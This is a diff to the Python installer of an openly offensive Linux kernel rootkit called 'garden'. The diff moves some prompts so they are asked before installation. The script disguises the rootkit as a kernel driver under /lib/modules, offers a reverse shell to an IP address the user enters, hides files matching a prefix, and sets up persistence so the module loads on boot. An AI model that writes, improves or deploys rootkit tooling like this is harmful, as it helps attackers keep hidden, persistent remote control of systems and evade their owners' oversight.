@@ -238,11 +238,18 @@ def install(kernel_version):
 	config = {}
 	config["MODULE_NAME"] = "garden"
 
+	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
+
 	if prompt_yes_no("Enable reverse shell?"):
 		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", None)
 
 	if prompt_yes_no("Enable hidden files?"):
 		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "garden")
+
+	if prompt_yes_no("Enable persistence?"):
+		persist_flag = True
+	else:
+		persist_flag = False
 
 	run_cmd_exit_on_fail("make clean", "./rootkit")
 
@@ -253,7 +260,6 @@ def install(kernel_version):
 
 	# Move compiled components to the right place. Maybe drop it in "/lib/modules/kernel-version/garden?
 	print_status("Installing rootkit...")
-	driver_name = prompt("Enter the name of a kernel driver to disguise your rootkit.", "garden")
 	module_dest_dir = "/lib/modules/{0}/kernel/drivers/{1}".format(kernel_version, driver_name)
 	if not os.path.exists(module_dest_dir):
 		os.mkdir(module_dest_dir)
@@ -270,7 +276,7 @@ def install(kernel_version):
 		sys.exit()
 
 	# Option to enable persistence by making the module load on boot.
-	if prompt_yes_no("Enable persistence?"):
+	if persist_flag:
 		enable_persistence(config["MODULE_NAME"])
 
 	run_cmd_exit_on_fail("depmod")
